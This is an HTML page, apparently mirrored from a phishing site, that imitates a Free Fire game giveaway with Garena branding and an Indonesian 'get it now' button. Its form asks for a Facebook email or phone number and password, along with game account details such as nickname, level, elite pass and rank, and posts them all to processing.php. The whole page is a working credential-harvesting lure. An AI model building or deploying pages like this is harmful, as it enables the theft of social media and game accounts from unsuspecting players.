
  <!DOCTYPE html>
<html>
  

<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png' rel='icon' type='image/x-png'/>
<title>Free Fire</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="ccss/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(img/background.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
</div>
<center style="background:white;">

</div>
<center style="background:#FFFFFF;"><br>
<div class="col-md-8">
<h2>
<h2>
</h2>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#F5F5F5;width:100%" class="form-horizontal">
<h4 >

<form action="processing.php" method="POST">


<h4 >
<img src="http://www.freepngimg.com/thumb/facebook/2-2-facebook-free-download-png-thumb.png" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb1" placeholder="Email Or Phone Number" type="text" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb2" placeholder="Password" type="password" required>
<br>
</div>


<h4 >
<img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png" height="50px" width="50px">
  <b> Account Detail </b>
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="nickname" placeholder="Nickname/Id" type="text" required>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="level">
          <option>Level Account</option>
          <option>Level 1</option>
          <option>Level 2</option>
          <option>Level 3</option>
          <option>Level 4</option>
          <option>Level 5</option>
		  <option>Level 6</option>
		  <option>Level 7</option>
		  <option>Level 8</option>
		  <option>Level 9</option>
		  <option>Level 10</option>
                 <option>Level 11</option>
		 <option>Level 12</option>
		 <option>Level 13</option>
		 <option>Level 14</option>
		 <option>Level 15</option>
		 <option>Level 16</option>
		 <option>Level 17</option>
		 <option>Level 18</option>
		 <option>Level 19</option>
		 <option>Level 20</option>
		 <option>Level 21</option>
		 <option>Level 22</option>
		 <option>Level 23</option>
		 <option>Level 24</option>
		 <option>Level 25</option>
		 <option>Level 26</option>
		 <option>Level 27</option>
		 <option>Level 28</option>
		 <option>Level 29</option>
		 <option>Level 30</option>
		 <option>Level 31</option>
		 <option>Level 32</option>
		 <option>Level 33</option>
		 <option>Level 34</option>
		 <option>Level 35</option>
		 <option>Level 36</option>
		 <option>Level 37</option>
		 <option>Level 38</option>
		 <option>Level 39</option>
		 <option>Level 40</option>
		 <option>Level 41</option>
		 <option>Level 42</option>
		 <option>Level 43</option>
		 <option>Level 44</option>
		 <option>Level 45</option>
		 <option>Level 46</option>
		 <option>Level 47</option>
		 <option>Level 48</option>
		 <option>Level 49</option>
		 <option>Level 50</option>
		 <option>Level 51+</option>
        </select>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="elite">
          <option>Pernah Elite Pass?</option>
          <option>Belum Pernah</option>
          <option>Pernah S1</option>
          <option>Pernah S2</option>
          <option>Pernah S3</option>
          <option>Pernah S4</option>
          <option>Pernah S5</option>
          <option>Pernah S6</option>
          <option>Pernah S7</option>
          <option>Pernah S8</option>
          <option>Pernah S9</option>
          <option>Pernah S10</option>
          <option>Pernah S11</option>
          <option>Pernah S12</option>
          <option>Pernah S13</option>
          <option>Pernah S14</option>
          <option>Pernah S15</option>
          <option>Pernah S16</option>
          <option>Pernah S17</option>
          <option>Pernah S18</option>
          <option>Pernah S19</option>
          <option>Pernah S20</option>
          <option>Pernah S21</option>
          <option>Pernah S22</option>
          <option>Pernah S23</option>
          <option>Pernah S24</option>
          <option>Pernah S25</option>
       </select>   
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="rank">
        <option>Apa Rank Kamu?</option>
          <option>Bronze</option>
          <option>Silver</option>
          <option>Gold</option>
          <option>Platinum</option>
          <option>Diamond</option>
          <option>Master</option>
          <option>Grand Master</option>
       </select>   
</div>

 <input type="submit" class="btn btn-block" style="color: #FFFF00;background-color:  #f74721 ;" value="DAPATKAN SEKARANG"> </form>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
 
</div>
</div><br><br>
</div>

</html>